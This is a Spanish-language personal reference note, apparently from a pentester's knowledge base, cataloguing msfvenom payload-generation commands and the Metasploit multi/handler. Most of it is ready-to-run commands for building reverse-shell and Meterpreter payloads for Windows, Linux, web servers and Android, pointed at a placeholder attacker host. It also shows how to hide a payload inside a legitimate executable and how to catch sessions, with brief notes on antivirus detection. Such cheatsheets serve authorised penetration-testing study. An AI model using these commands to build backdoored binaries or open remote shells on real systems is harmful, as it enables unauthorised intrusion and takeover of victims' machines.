---
tipo: meta
aliases:
  - msfvenom - matriz
  - msfvenom cheatsheet
  - multi/handler
tags:
  - meta/referencia
  - dominio/post-explotacion
---

# msfvenom - matriz de referencia

> [!info] Referencia pura, no un zettel
> Generación de payloads con msfvenom y el handler que los atrapa. El criterio —cuándo un binario generado en vez de un one-liner nativo— vive en [[Payload generado con msfvenom]] y [[MOC - Shells]]; la herramienta, en [[metasploit]]. Para one-liners nativos: [[Reverse y bind shells - matriz de referencia]].

> [!warning] Cuadros anchos a propósito
> Las líneas de comando superan el ancho de la ventana. Scrolleá o apagá el ajuste con `<leader>uw`.

`ATACANTE`/`PUERTO` = `LHOST`/`LPORT` de tu handler. Sin datos de objetivo real.

## Forma general
```sh
msfvenom -p <payload> LHOST=ATACANTE LPORT=PUERTO -f <formato> -o <salida>
```
`-p` payload · `-f` formato de salida · `-o` archivo · `-e` encoder · `-i` iteraciones · `-b` bad chars · `-a`/`--platform` arquitectura y plataforma · `msfvenom -l payloads` los lista.

## Staged vs stageless — se lee en el nombre

| | Staged (`/`) | Stageless (`_`) |
|---|---|---|
| Ejemplo | `windows/meterpreter/reverse_tcp` | `windows/meterpreter_reverse_tcp` |
| Qué manda | stager chico que descarga la etapa | todo el código en el artefacto |
| Tamaño | mínimo inicial | más grande |
| Conexiones | dos (stager + etapa) | una |
| Confiabilidad | frágil si la 2ª conexión no vuelve | **más confiable** sobre enlaces malos |
| Elegir cuando | espacio/tamaño limitado, egress estable | egress de un solo tiro, o un tamaño no importa |

Regla mnemónica: **barra (`/`) = staged, guión bajo (`_`) = stageless.**

## Payloads por plataforma

| Objetivo | Payload (staged) | Formato típico | Comando |
|---|---|---|---|
| Windows x64 | `windows/x64/meterpreter/reverse_tcp` | `exe` | `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATACANTE LPORT=PUERTO -f exe -o s.exe` |
| Windows DLL | `windows/x64/meterpreter/reverse_tcp` | `dll` | `... -f dll -o s.dll` |
| Linux x64 | `linux/x64/meterpreter/reverse_tcp` | `elf` | `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=ATACANTE LPORT=PUERTO -f elf -o s.elf` |
| PHP | `php/meterpreter_reverse_tcp` | `raw` | `msfvenom -p php/meterpreter_reverse_tcp LHOST=ATACANTE LPORT=PUERTO -f raw -o s.php` |
| JSP | `java/jsp_shell_reverse_tcp` | `raw` | `... -f raw -o s.jsp` |
| WAR (Tomcat) | `java/jsp_shell_reverse_tcp` | `war` | `... -f war -o s.war` |
| ASPX | `windows/x64/meterpreter/reverse_tcp` | `aspx` | `... -f aspx -o s.aspx` |
| Python | `python/meterpreter_reverse_tcp` | `raw` | `... -f raw -o s.py` |
| Android | `android/meterpreter/reverse_tcp` | `apk` | `msfvenom -p android/meterpreter/reverse_tcp LHOST=ATACANTE LPORT=PUERTO -o s.apk` |
| Shellcode (C) | `windows/x64/exec CMD=calc.exe` | `c` | `... -f c -b '\x00\x0a'` |

El payload PHP/JSP hay que envolverlo con `<?php ... ?>` o guardarlo como espera el server — revisar el archivo antes de subirlo.

## Shell simple vs Meterpreter

| Quiero | Payload | Nota |
|---|---|---|
| Solo una shell de comandos | `windows/x64/shell/reverse_tcp` · `linux/x64/shell_reverse_tcp` | Más chico y menos firmado que Meterpreter |
| Sesión Meterpreter | `.../meterpreter/...` | Pivot, `hashdump`, migración, transferencia |
| Sin conexión saliente (bind) | `.../meterpreter/bind_tcp` | El objetivo escucha — ver [[Shell - conexión bind]] |


## Encoders y bad chars
> [!warning] El encoder NO evade EDR moderno
> `shikata_ga_nai` y compañía ofuscan bytes, no comportamiento; están firmados hace años. Se usan para **excluir bad chars** en explotación de memoria, no para sigilo. Para evadir de verdad hace falta otra cosa (fuera del alcance de esta matriz).

| Objetivo | Flag | Ejemplo |
|---|---|---|
| Excluir bytes prohibidos | `-b` | `-b '\x00\x0a\x0d'` |
| Encoder + iteraciones | `-e` `-i` | `-e x86/shikata_ga_nai -i 5` |
| Plantilla legítima (binario real) | `-x` | `-x plantilla.exe -k` (`-k` mantiene el original funcionando) |


## Atrapar la sesión — multi/handler
```sh
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST ATACANTE; set LPORT PUERTO; set ExitOnSession false; exploit -j"
```
`PAYLOAD`, `LHOST` y `LPORT` deben coincidir **exactos** con los de msfvenom. `exploit -j` lo deja en segundo plano (`-j` = job); `sessions -i N` entra a la sesión N. Para una shell simple (no Meterpreter), un `nc -lvnp PUERTO` alcanza — ver [[Reverse y bind shells - matriz de referencia]] § listeners.

## Errores frecuentes

| Síntoma | Causa | Salida |
|---|---|---|
| El binario no ejecuta | arquitectura equivocada (x64 vs x86) | igualar `-p` a la del proceso destino |
| Se conecta y muere | `PAYLOAD` del handler no coincide | mismo payload exacto en msfvenom y en el handler |
| Staged no completa la sesión | la 2ª conexión (etapa) no vuelve | usar el stageless (`_`) |
| Shellcode se corta | bad char sin excluir | agregarlo a `-b` |
| AV lo borra al escribir | payload/encoder firmado | es esperable — ver el aviso; entrega en memoria o evasión real |

